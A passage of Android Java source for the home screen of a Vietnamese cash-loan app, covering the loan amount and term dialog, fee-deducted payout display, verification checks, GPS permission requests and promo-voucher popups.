                        editor.putInt("isshebao", isshebao);
                        editor.putInt("isjob", isjob);
                        editor.putInt("isfacebook", isfacebook);
                        editor.putInt("profession", profession);
                        editor.putInt("username", username);
                        editor.putString("p1", jsonObject.getString("p1"));
                        editor.putString("p2", jsonObject.getString("p2"));
                        editor.putString("p3", jsonObject.getString("p3"));
                        editor.putString("w1", jsonObject.getString("w1"));
                        editor.putString("w2", jsonObject.getString("w2"));
                        editor.putString("w3", jsonObject.getString("w3"));
                        editor.putString("s1", jsonObject.getString("s1"));
                        editor.putString("s2", jsonObject.getString("s2"));
                        editor.putString("s3", jsonObject.getString("s3"));
                        editor.putString("day30", jsonObject.getString("day30"));
                        editor.putString("day15", jsonObject.getString("day15"));
                        editor.putString("day15_2", jsonObject.getString("TSday15"));
                        editor.putString("day30_2", jsonObject.getString("TSday30"));
                        editor.putString("TSdayJE", jsonObject.getString("TSdayJE"));
                        editor.putString("onlinepay", jsonObject.getString("onlinepay"));

                        editor.commit();
                        Log.i("MOFA", "Homeinit -- 存入数据库");
                        iseducation = 1;
                        isshebao = 1;

                        if (IndexActivity.loan) {
                            oMoney = Double.valueOf(sp
                                    .getString("loanmoney", "3000000"));
                            days = sp.getInt("loandays", 30);
                            sbMoney.setProgress((int) (oMoney / 10000));
                            switchDays(days);
                            setLoanDialog();
                            IndexActivity.loan = false;
                        }

                    } catch (JSONException e1) {
                        Log.e("MOFA", e1.getMessage());
                    }
                    btnLoan.setClickable(true);
                    break;
                case Config.CODE_ERROR:
                    ToastUtil.showShort(activityWeakReference.get(), "system error");
                    break;
                case Config.CODE_URL_ERROR:
                    ToastUtil.showShort(activityWeakReference.get(),
                            getResources().getString(R.string.url_error));

                    Log.i("MOFA", "-HomeFragment3--CashLoan_打印"
                            + getResources().getString(R.string.url_error));
                    break;
                case Config.CODE_NET_ERROR:
                    ToastUtil.showShort(activityWeakReference.get(),
                            getResources().getString(R.string.network_error));

                    Log.i("MOFA", "-HomeFragment3--CashLoan_打印"
                            + getResources().getString(R.string.network_error));
                    break;
                case Config.CODE_CONTACT_FAILED:
                    Log.i("MOFA",
                            "-HomeFragment3--uploadcontact-updatecontact wrong");
                    break;
                case Config.CODE_CONTACT_SUCCESS:
                    Log.i("MOFA",
                            "-HomeFragment3--uploadcontact-CODE_CONTACT_SUCCESS");
                    break;
                default:
                    break;
            }
        }
    }

    private void switchDays(int i) {
        if (i == 15) {
            days = 15;
            tvDay.setText(getResources().getString(R.string.day15));
            tvDay15.setBackgroundResource(R.drawable.chooseday);
            tvDay30.setBackgroundResource(R.drawable.unchooseday);
        } else {
            days = 30;
            tvDay.setText(getResources().getString(R.string.day30));
            tvDay15.setBackgroundResource(R.drawable.unchooseday);
            tvDay30.setBackgroundResource(R.drawable.chooseday);
        }
    }

    private void showDialog2(String Message) {
        new AlertDialog(ac)
                .builder()
                .setMsg(Message)
                .setPositiveButton(getResources().getString(R.string.OK),
                        new View.OnClickListener() {

                            @Override
                            public void onClick(View v) {
                                // 转到手机设置界面，用户设置GPS
                                Intent intent = new Intent(
                                        Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                                startActivityForResult(intent, 0); // 设置完成后返回到原来的界面

                            }
                        })
                .setNegativeButton(getResources().getString(R.string.cancle),
                        new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                            }
                        }).show();
    }

    @Override
    public void onResume() {
        super.onResume();
        SharedPreferences sp = ac.getSharedPreferences("config",
                Context.MODE_PRIVATE);
        userid = sp.getString("userid", "");
        // String url = Config.HOME_INIT + "&jkld=" + userid;
        String url = Config.HOME_INIT + "&jkld=" + userid + "&qwer="
                + MD5Util.md5(userid);

        HttpUtils.doGetAsyn(url, mHandler, Config.CODE_HOME_INIT);
        Log.i("MOFA", "HomeFragment2---onResume:" + System.currentTimeMillis());
    }


    @Override
    public void onPause() {
        if (locations != null) {
            locations.cancleListener();
        }
        SharedPreferences sp = ac.getSharedPreferences("config", ac.MODE_PRIVATE);
        SharedPreferences.Editor editor = sp.edit();
        editor.putString("loanmoney", "" + oMoney);
        editor.putInt("loandays", days);
        editor.commit();
        super.onPause();
    }

    /**
     * 监听GPS
     */
    private void initGPS() {
        LocationManager locationManager = (LocationManager) ac
                .getSystemService(Context.LOCATION_SERVICE);
        locations = new LocationUtil(ac, mHandler);

        // 判断GPS模块是否开启，如果没有则开启
        if (!locationManager
                .isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            // Toast.makeText(ac, "请打开GPS", Toast.LENGTH_SHORT).show();
            showDialog2(getResources().getString(R.string.open_GPS_please));
        } else if (Build.VERSION.SDK_INT >= 23) {
            if (ac.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                    || ac.checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED
                    || ac.checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                // 申请权限 第二个参数是一个 数组 说明可以同时申请多个权限
                ac.requestPermissions(new String[]{
                                android.Manifest.permission.ACCESS_FINE_LOCATION,
                                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                                android.Manifest.permission.WRITE_EXTERNAL_STORAGE},
                        PermissionUtils.LOCATION_PERMISSION);
            } else {
                // 已授权
                // getBestLocation();
                if (isyhbd == 1
                        && isshenfen == 1
                        && islianxi == 1
                        && ((isschool == 1 && profession == 1) || (profession == 2 && isjob == 1))) {
                    HttpUtils.doGetAsyn(
                            Config.IWANTMONEY_CORD + "&userid=" + userid
                                    + "&jk_money="
                                    + Formatdou.formatdou(oMoney + "")
                                    + "&jk_date=" + days / 15 + "&annualrate="
                                    + (30) + "&phone=" + mobilephone
                                    + "&hongbaoid=" + hongbaoid + "&jkds="
                                    + MD5Util.md5(userid), mHandler,
                            Config.CODE_IWANTMONEY);
                } else {
                    //TODO
                    ToastUtil.showShort(ac, "Xin xác minh trước");
                }
                locations.getLocation(ac, mHandler);
            }
        } else {
            if (isyhbd == 1
                    && isshenfen == 1
                    && islianxi == 1
                    && ((isschool == 1 && profession == 1) || (profession == 2 && isjob == 1))) {
                HttpUtils.doGetAsyn(Config.IWANTMONEY_CORD + "&userid=" + userid
                                + "&jk_money=" + Formatdou.formatdou(oMoney + "")
                                + "&jk_date=" + days / 15 + "&annualrate=" + (30)
                                + "&phone=" + mobilephone + "&hongbaoid=" + hongbaoid
                                + "&jkds=" + MD5Util.md5(userid), mHandler,
                        Config.CODE_IWANTMONEY);
            } else {
                //TODO
                ToastUtil.showShort(ac, "Xin xác minh trước");
            }
            locations.getLocation(ac, mHandler);
        }
    }

    private void setLoanDialog() {
        Log.i("MOFA", "点击确认借款--借款：" + oMoney + "--时间：" + days);
        final android.app.AlertDialog phoneDialog = new android.app.AlertDialog.Builder(
                ac).create();
        LayoutInflater lay = LayoutInflater.from(ac);
        final View inflate = lay.inflate(R.layout.layout_loan_dialog,
                null);
        TextView tvLoanMoney = inflate
                .findViewById(R.id.tv_loan_money_check);
        tvLoanMoney.setText(Formatdou.formatDouble(oMoney/1000000) + " triệu VND");
        TextView tvLoanMoneyActul = inflate
                .findViewById(R.id.tv_loan_money_actul);
        double actulMoney;
        if (oMoney/1000000 > TSLoanMoney) {
            if (days == 30) {
                actulMoney = oMoney - oMoney * Double.valueOf(day30 + inverst30);
            } else {
                actulMoney = oMoney - oMoney * Double.valueOf(day15 + inverst15);
            }
        } else {
            if (days == 30) {
                actulMoney = oMoney - oMoney * Double.valueOf(day30_2 + inverst30);
            } else {
                actulMoney = oMoney - oMoney * Double.valueOf(day15_2 + inverst15);
            }
        }
        tvLoanMoneyActul.setText(Formatdou.formatDouble(actulMoney/1000000)
                + " triệu VND");
        TextView tvLoanDay = inflate
                .findViewById(R.id.tv_loan_day_check);
        tvLoanDay.setText(days + " " + getResources().getString(R.string.day));
        inflate.findViewById(R.id.btn_agree).setOnClickListener(
                new View.OnClickListener() {

                    @Override
                    public void onClick(View v) {
                        phoneDialog.dismiss();
                        final SharedPreferences sp = ac
                                .getSharedPreferences("config",
                                        Context.MODE_PRIVATE);
                        Log.i("MOFA", "点击确认借款--借款：" + oMoney + "--时间：" + days
                                + "--认证:" + isyhbd + isshenfen + islianxi
                                + isschool + isjob + isfacebook);
                        if (isyhbd == 1
                                && isshenfen == 1
                                && islianxi == 1
                                && ((isschool == 1 && profession == 1) || (profession == 2 && isjob == 1))) {
                            if (Build.VERSION.SDK_INT >= 23) {
                                if (ac.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                                        || ac.checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                                    // 申请权限 第二个参数是一个 数组 说明可以同时申请多个权限
                                    ac.requestPermissions(
                                            new String[]{
                                                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                                                    android.Manifest.permission.ACCESS_COARSE_LOCATION},
                                            PermissionUtils.LOCATION_PERMISSION);
                                } else {// 已授权
                                    initGPS();
                                    // getBestLocation();
                                }
                            } else {
                                initGPS();
                                // getBestLocation();
                            }
                        } else {
                            SharedPreferences.Editor editor = sp.edit();
                            editor.putString("loanmoney", "" + oMoney);
                            editor.putInt("loandays", days);
                            editor.commit();
                            if (isyhbd == 0) {
                                Intent intent = new Intent(ac,
                                        BindCard3Activity.class);
                                startActivity(intent);
                            } else if (isshenfen == 0) {
                                String sfcmnd = sp.getString("sfcmnd", null);
                                if (TextUtils.isEmpty(sfcmnd)) {
                                    Intent intent = new Intent(ac,
                                            BaseInfo2Activity.class);
                                    startActivity(intent);
                                } else {
                                    Intent intent = new Intent(ac,
                                            IDCard3Activity.class);
                                    intent.putExtra("username",
                                            sp.getString("sfname", null));
                                    intent.putExtra("IDnumber",
                                            sp.getString("sfcmnd", null));
                                    intent.putExtra("address",
                                            sp.getString("sfaddress", null));
                                    intent.putExtra("addressnow",
                                            sp.getString("sfhomeaddress", null));
                                    intent.putExtra("gender",
                                            sp.getString("sfsex", null));
                                    intent.putExtra("email",
                                            sp.getString("sfemail", null));
                                    intent.putExtra("both",
                                            sp.getString("sfage", null));
                                    intent.putExtra("phonetype",
                                            sp.getString("sfphonetype", null));
                                    intent.putExtra("from", "base");
                                    startActivity(intent);
                                }
                            } else if (islianxi == 0) {
                                Intent intent = new Intent(ac,
                                        RelationInfo3Activity.class);
                                startActivity(intent);
                            } else if (profession == 2 && isjob == 0) {
                                Intent intent = new Intent(ac,
                                        WorkInfo3Activity.class);
                                startActivity(intent);
                            } else if (profession == 1 && isschool == 0) {
                                Intent intent = new Intent(ac,
                                        StudentInfo2Activity.class);
                                startActivity(intent);
                                // } else if (isfacebook == 0) {
                                // startActivity(new Intent(ac,
                                // FacebookAcytivity.class));
                            }
                        }
                    }
                });
        inflate.findViewById(R.id.iv_close).setOnClickListener(
                new View.OnClickListener() {

                    @Override
                    public void onClick(View v) {
                        phoneDialog.dismiss();
                    }
                });
        final CheckBox cbHongbao = inflate
                .findViewById(R.id.cb_hongbao);
        final TextView tvChooseHongbao = inflate
                .findViewById(R.id.tv_choose_hongbao);
        final TextView tvHongbao = inflate
                .findViewById(R.id.tv_hongbao);
        final LinearLayout llHongbao = inflate
                .findViewById(R.id.ll_hongbao);
        tvHongbao.setText("Phiếu khuyến mãi " + hongbaoje + " ₫");
        tvChooseHongbao.setText("Phiếu khuyến mãi " + hongbaoje + " ₫");
        tvChooseHongbao.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                // Intent intent = new Intent(ac,
                // HongbaoActivity.class);
                // startActivityForResult(intent, 9);
                tvHongbao.setText(tvChooseHongbao.getText());
                cbHongbao.setChecked(true);
            }
        });
        cbHongbao.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {

            @Override
            public void onCheckedChanged(CompoundButton buttonView,
                                         boolean isChecked) {
                if (isChecked) {
                    hongbaoid = 1;
                    tvHongbao.setTextColor(Color.parseColor("#ffee3c3c"));
                } else {
                    hongbaoid = 0;
                    tvHongbao.setTextColor(Color.parseColor("#ffcccccc"));
                }
            }
        });
        if ("1".equalsIgnoreCase(fxhongbao)) {

            if ("1".equalsIgnoreCase(oldhongbao)) {
                tvChooseHongbao.setText("Không có phiếu khuyến mãi!");
                llHongbao.setVisibility(View.GONE);
                hongbaoid = 0;
            } else {
                if ("1".equalsIgnoreCase(hongbao)
                        || "1".equalsIgnoreCase(hongbaosj)) {
                    tvChooseHongbao.setText("Không có phiếu khuyến mãi!");
                    llHongbao.setVisibility(View.GONE);
                    hongbaoid = 0;
                }
            }

        } else {
            tvChooseHongbao.setText("Không có phiếu khuyến mãi!");
            llHongbao.setVisibility(View.GONE);
            hongbaoid = 0;

        }
        phoneDialog.show();
        phoneDialog.setCanceledOnTouchOutside(true);
        phoneDialog.setContentView(inflate);

        oMoney = sbMoney.getProgress() * 10000;
        String money = df2.format(oMoney);
        money = money.replace(",", ".");
        oMoney = Double.valueOf(money);
//
//        if (sbDay.getProgress() >= 225) {
//            days = 30;
//        } else {
//            days = 15;
//        }
    }

    /**
     * 从服务器取图片
     *
     * @param url
     * @return
     */
    public void getHttpBitmap(final String url) {
        new Thread() {
            public void run() {
                Message msg = Message.obtain();
                URL myFileUrl = null;
                Bitmap bitmap = null;
                try {
                    myFileUrl = new URL(url);
                } catch (MalformedURLException e) {
                    Log.i("MOFA", "HomeFragment2---通知图片路径错误：" + url);
                    Log.e("MOFA", e.getMessage());
                }
                try {
                    HttpURLConnection conn = (HttpURLConnection) myFileUrl
                            .openConnection();
                    conn.setConnectTimeout(0);
                    conn.setDoInput(true);
                    conn.connect();
                    if (conn.getResponseCode() == 200) {
                        InputStream is = conn.getInputStream();
                        bitmap = BitmapFactory.decodeStream(is);
                        msg.what = 1110;
                        msg.obj = bitmap;
                        // showHongbao(bitmap, title);
                        mHandler.sendMessage(msg);
                        is.close();
                        Log.i("MOFA", "HomeFragment2---通知图片获取");
                    } else {
                        Log.i("MOFA", "HomeFragment2---通知图片获取错误，状态码不为200");
                    }
                } catch (IOException e) {
                    Log.e("MOFA", "HomeFragment2---通知图片获取错误：" + e.getMessage());
                    e.printStackTrace();
                }
            }

        }.start();
    }

    private void showHongbao(Bitmap bitmap, String title) {
        Log.i("MOFA", "HomeFragment2---显示通知1");
        final android.app.AlertDialog phoneDialog = new android.app.AlertDialog.Builder(
                ac).create();
        LayoutInflater lay = LayoutInflater.from(ac);
        final View inflate = lay.inflate(R.layout.layout_hongbao_dialog,
                null);
        inflate.findViewById(R.id.btn_go).setOnClickListener(
                new View.OnClickListener() {

                    @Override
                    public void onClick(View v) {
                        phoneDialog.dismiss();
                        Intent intent = new Intent(ac, ShareActivity.class);
                        startActivity(intent);
                    }
                });
        inflate.findViewById(R.id.iv_close).setOnClickListener(
                new View.OnClickListener() {

                    @Override
                    public void onClick(View v) {
                        phoneDialog.dismiss();
                    }
                });
        TextView tvTitle = inflate.findViewById(R.id.tv_title);
        ImageView ivShow = inflate.findViewById(R.id.iv_show);
        if (bitmap == null) {
            ivShow.setVisibility(View.GONE);
            // TextPaint tp = tvTitle.getPaint();
            // tp.setFakeBoldText(false);
            tvTitle.setTypeface(Typeface.DEFAULT);
            Log.i("MOFA", "HomeFragment2---显示通知2");
        } else {
            ivShow.setImageBitmap(bitmap);
        }
        if (TextUtils.isEmpty(title)) {
            tvTitle.setVisibility(View.GONE);
        } else {
            tvTitle.setText(title);
        }
        phoneDialog.show();
        phoneDialog.setCanceledOnTouchOutside(false);
        phoneDialog.setContentView(inflate);
        Log.i("MOFA", "HomeFragment2---显示通知3");
    }

    private void setVerfyDialog() {
        final android.app.AlertDialog phoneDialog = new android.app.AlertDialog.Builder(
                ac).create();
        LayoutInflater lay = LayoutInflater.from(ac);
        final View inflate = lay.inflate(R.layout.layout_veify_dialog3,
                null);
        inflate.findViewById(R.id.btn_agree).setOnClickListener(
                new View.OnClickListener() {

                    @Override
                    public void onClick(View v) {
                        phoneDialog.dismiss();

                        if (isyhbd == 0) {
                            Intent intent = new Intent(ac,
                                    BindCard3Activity.class);
                            startActivity(intent);
                        } else if (isshenfen == 0) {
                            final SharedPreferences sp = ac
                                    .getSharedPreferences("config",
                                            Context.MODE_PRIVATE);
                            String sfcmnd = sp.getString("sfcmnd", null);
                            SharedPreferences.Editor editor = sp.edit();
                            editor.putString("loanmoney", "" + oMoney);
                            editor.putString("loandays", "" + days);
                            editor.commit();
                            if (TextUtils.isEmpty(sfcmnd)) {
                                Intent intent = new Intent(ac,
                                        BaseInfo2Activity.class);
                                startActivity(intent);
                            } else {
                                Intent intent = new Intent(ac,
                                        IDCard3Activity.class);
                                intent.putExtra("username",
                                        sp.getString("sfname", null));
                                intent.putExtra("IDnumber",
                                        sp.getString("sfcmnd", null));
                                intent.putExtra("address",
                                        sp.getString("sfaddress", null));
                                intent.putExtra("addressnow",
                                        sp.getString("sfhomeaddress", null));
                                intent.putExtra("gender",
                                        sp.getString("sfsex", null));
                                intent.putExtra("email",
                                        sp.getString("sfemail", null));
                                intent.putExtra("both",
                                        sp.getString("sfage", null));
                                intent.putExtra("phonetype",
                                        sp.getString("sfphonetype", null));
                                intent.putExtra("from", "base");
                                startActivity(intent);
                            }
                        } else if (islianxi == 0) {
                            Intent intent = new Intent(ac,
                                    RelationInfo3Activity.class);
                            startActivity(intent);
                        } else if (profession == 2 && isjob == 0) {
                            Intent intent = new Intent(ac,
                                    WorkInfo3Activity.class);
                            startActivity(intent);
                        } else if (profession == 1 && isschool == 0) {
                            Intent intent = new Intent(ac,
                                    WorkInfo3Activity.class);
                            startActivity(intent);
                            // } else if (isfacebook == 0) {
                            // startActivity(new Intent(ac,
                            // FacebookAcytivity.class));
                        }

                    }
                });
        phoneDialog.show();
        phoneDialog.setCanceledOnTouchOutside(true);
        phoneDialog.setContentView(inflate);
    }

    @Override
    public void onDestroy() {
        time.cancel();
        super.onDestroy();
    }

}
